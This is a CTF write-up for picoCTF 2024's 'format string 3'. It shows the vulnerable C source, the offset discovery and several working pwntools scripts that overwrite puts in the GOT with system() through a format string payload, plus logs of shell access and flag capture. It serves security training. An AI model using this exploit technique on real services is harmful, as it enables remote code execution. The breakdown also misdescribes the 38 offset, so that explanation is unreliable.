### format string 3

Author: SkrubLawd
#medium #Binary_exploitation #picoCTF2024 #format_string #browser_web_shell 
#### Description

This program doesn't contain a win function. How can you win? Download the binary [here](https://artifacts.picoctf.net/c_rhea/2/format-string-3). Download the source [here](https://artifacts.picoctf.net/c_rhea/2/format-string-3.c). Download libc [here](https://artifacts.picoctf.net/c_rhea/2/libc.so.6), download the interpreter [here](https://artifacts.picoctf.net/c_rhea/2/ld-linux-x86-64.so.2). Run the binary with these two files present in the same directory.

Additional details will be available after launching your challenge instance.
Connect with the challenge instance here: `nc rhea.picoctf.net 50071`



##### Solution:
```c
#include <stdio.h>

#define MAX_STRINGS 32

char *normal_string = "/bin/sh";

void setup() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
}

void hello() {
	puts("Howdy gamers!");
	printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf);
}

int main() {
	char *all_strings[MAX_STRINGS] = {NULL};
	char buf[1024] = {'\0'};

	setup();
	hello();	

	fgets(buf, 1024, stdin);	
	printf(buf);

	puts(normal_string);

	return 0;
}

```

Since printf(buf) is used, it seems that this can also be attacked with FSB.

Furthermore, since puts(normal_string)(normal_string="/bin/sh") is executed, if you rewrite the address of puts to the address of the system function, you will be able to start the shell and get the flag.

    offset when printf
    puts on GOT
    Address of system function on libc

Three pieces of information are required.

You can see that the offset at printf is 38 by inputting %n$p to the instance. 

```css
┌──(myenv)─(kali㉿kali)-[~/Downloads/format_string3]
└─$ ./format-string-3
Howdy gamers!
Okay I'll be nice. Here's the address of setvbuf in libc: 0x7fd5148ab3f0
%38$p
0xa7024383325
/bin/sh
```

When you check the puts on the GOT with gdb, you can see that it is 0x401080.

```css
(gdb) p puts
$1 = {<text variable, no debug info>} 0x401080 <puts@plt>
```

The address of the system function on libc is calculated based on the address of setvbuf output by the instance, since the address of the function on libc seems to change every time.
Calculate the difference between setvbuf and system from libc.so.6, and add that difference to the address of setvbuf when actually accessing the instance.
I implemented this using pwntools as follows.

```python
import sys
from pwn import *
from pwnlib.elf.elf import *
from pwnlib.fmtstr import *

context.arch='amd64'

fs3 = ELF('./format-string-3')
got_puts = fs3.got['puts']
print(f'got_puts: {hex(got_puts)}')

libc = ELF('./libc.so.6')
libc_system = libc.symbols['system']
print(f'libc_system: {hex(libc_system)}')
libc_setvbuf = libc.symbols['setvbuf']
print(f'libc_setvbuf: {hex(libc_setvbuf)}')

host = sys.argv[1]
port = int(sys.argv[2])
r = remote(host, port)

m = r.recvregex(b'libc: 0x([0-9a-f]+)\n', capture=True)
matched_string = m.group(0).decode()
log.info(f'matched_string: {matched_string}')
loaded_libc_setvbuf = int(m.group(1).decode(), 16)

loaded_libc_system = loaded_libc_setvbuf + (libc_system - libc_setvbuf)
log.info(f'loaded_libc_system: {hex(loaded_libc_system)}')

loaded_libc_system_lower = loaded_libc_system & 0xffffffff
format_string = fmtstr_payload(38, {got_puts:loaded_libc_system}, numbwritten=0, write_size='byte')

r.sendline(format_string)
r.interactive()
```

# Format String Exploit Code Breakdown

## Overview
This Python script uses the `pwntools` library to exploit a format string vulnerability in a binary (`format-string-3`). The objective is to overwrite the Global Offset Table (GOT) entry for `puts` with the address of `system()` from libc, enabling the execution of a shell.

## Code Breakdown

### Imports and Setup
```python
import sys
from pwn import *
from pwnlib.elf.elf import *
from pwnlib.fmtstr import *

context.arch='amd64'
```
- **Imports**:
  - `sys`: For command-line argument handling.
  - `pwn`: The main pwntools library for exploitation.
  - `pwnlib.elf.elf`: To handle ELF binaries.
  - `pwnlib.fmtstr`: To simplify format string payload creation.

- **Context**: Set the architecture to `amd64` to indicate the target binary's architecture.

### ELF Loading
```python
fs3 = ELF('./format-string-3')
got_puts = fs3.got['puts']
```
- Load the target binary into an ELF object (`fs3`), allowing access to its symbols and sections.
- Retrieve the address of the `puts` GOT entry.

### Libc Loading
```python
libc = ELF('./libc.so.6')
libc_system = libc.symbols['system']
libc_setvbuf = libc.symbols['setvbuf']
```
- Load the libc library used by the binary to access its functions.
- Retrieve the addresses of `system` and `setvbuf` from the libc.

### Remote Connection
```python
host = sys.argv[1]
port = int(sys.argv[2])
r = remote(host, port)
```
- Connect to the remote service using the host and port provided as command-line arguments.

### Leaking the Loaded `setvbuf` Address
```python
m = r.recvregex(b'libc: 0x([0-9a-f]+)\n', capture=True)
matched_string = m.group(0).decode()
log.info(f'matched_string: {matched_string}')
loaded_libc_setvbuf = int(m.group(1).decode(), 16)
```
- Receive output from the server that contains the loaded address of `setvbuf`.
- Use a regular expression to capture this address and log it.

### Calculate `system()` Address
```python
loaded_libc_system = loaded_libc_setvbuf + (libc_system - libc_setvbuf)
log.info(f'loaded_libc_system: {hex(loaded_libc_system)}')
```
- Calculate the actual address of `system()` in the loaded libc using the offset from `setvbuf`.
- Log the calculated address for debugging purposes.

### Creating the Format String Payload
```python
loaded_libc_system_lower = loaded_libc_system & 0xffffffff
format_string = fmtstr_payload(38, {got_puts:loaded_libc_system}, numbwritten=0, write_size='byte')
```
- Mask the `system` address to the lower 32 bits, if necessary.
- Use `fmtstr_payload` to create a format string payload that writes the `system` address to the `puts` GOT entry. The `38` represents the number of characters to print before writing, which depends on the specific format string offsets.

### Sending the Payload
```python
r.sendline(format_string)
r.interactive()
```
- Send the crafted format string payload to the server.
- Switch to interactive mode to allow user interaction with the shell if the exploit is successful.

## Summary
This script automates the process of exploiting a format string vulnerability:
- Connects to the target service.
- Leaks necessary addresses.
- Calculates the address of `system()`.
- Constructs and sends the payload to overwrite the `puts` entry in the GOT with that address.

## Next Steps
- Ensure you have the correct version of `libc.so.6` that matches the server.
- Adjust `got_puts` and offsets based on your specific binary layout.
- Test the script and refine it as needed based on server responses.


```css
┌──(myenv)─(kali㉿kali)-[~/Downloads]
└─$ python3 test.py rhea.picoctf.net 50071
[!] Could not populate PLT: No module named 'pkg_resources'
[*] '/home/kali/Downloads/format-string-3'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x3ff000)
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
got_puts: 0x404018
[!] Could not populate PLT: No module named 'pkg_resources'
[*] '/home/kali/Downloads/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
libc_system: 0x4f760
libc_setvbuf: 0x7a3f0
[+] Opening connection to rhea.picoctf.net on port 50071: Done
[*] matched_string: libc: 0x7aae444f53f0
[*] loaded_libc_system: 0x7aae444ca760
[*] Switching to interactive mode
                                                                                               c                         \x8b                                            \xa0      \x01                                                                                                                                                     \x00       \x00aaaabaa\x18@@$  
$ ls
Makefile
artifacts.tar.gz
flag.txt
format-string-3
format-string-3.c
ld-linux-x86-64.so.2
libc.so.6
metadata.json
profile
$ cat flag.txt
picoCTF{G07_G07?_92325514}$  
```


or
```python
from pwn import *
binsh = 0x402008
puts_got = 0x404018
context.arch = 'amd64'

setvbuf_offset = 500720
system_offset = 325472

chall = remote('rhea.picoctf.net', *)
log.info(chall.recvuntil(b'libc: '))
leak = chall.recvline()
payload = fmtstr_payload(38, {puts_got: int(leak.strip(),16)-setvbuf_offset + system_offset })

chall.sendline(payload)
chall.interactive()
```

or

```python
from pwn import *
# binsh = 0x402008

context.arch = 'amd64'

# puts_got = 0x404018
# setvbuf_offset = 500720
# system_offset = 325472

fs3 = ELF('./format-string-3')
puts_got = fs3.got['puts']

libc = ELF('./libc.so.6')
setvbuf_offset = libc.symbols['setvbuf']
system_offset = libc.symbols['system']

# chall = remote('rhea.picoctf.net', *)
# chall = remote('rhea.picoctf.net', 59498)
chall = process('./format-string-3')
log.info(chall.recvuntil(b'libc: '))
leak = chall.recvline()
payload = fmtstr_payload(38, {puts_got: int(leak.strip(),16)-setvbuf_offset + system_offset })

chall.sendline(payload)
chall.interactive()
```

```css
┌──(myenv)─(kali㉿kali)-[~/Downloads/format_string3]
└─$ python3 test4.py
[!] Could not populate PLT: No module named 'pkg_resources'
[*] '/home/kali/Downloads/format_string3/format-string-3'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x3ff000)
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[!] Could not populate PLT: No module named 'pkg_resources'
[*] '/home/kali/Downloads/format_string3/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
[+] Starting local process './format-string-3': pid 24343
/home/kali/Downloads/myenv/lib/python3.12/site-packages/pwnlib/log.py:396: BytesWarning: Bytes is not text; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  self._log(logging.INFO, message, args, kwargs, 'info')
[*] Howdy gamers!
    Okay I'll be nice. Here's the address of setvbuf in libc: 
[*] Switching to interactive mode
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               c                              \x8b                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                \xf0                                                                                                                                                                                                                         \x01a\x18@@$                                                                                                                                          l                                                                                                                                                                                         ls                                                                                                                                                                                        ls
flag.txt         format-string-3.c     libc.so.6  test3.py  test.py
format-string-3  ld-linux-x86-64.so.2  test2.py   test4.py
$ 
$ 
$ cat flag.txt
picoCTF{format_string3}$ exit
[*] Got EOF while reading in interactive
$ 
[*] Process './format-string-3' stopped with exit code 0 (pid 24343)
[*] Got EOF while sending in interactive
```

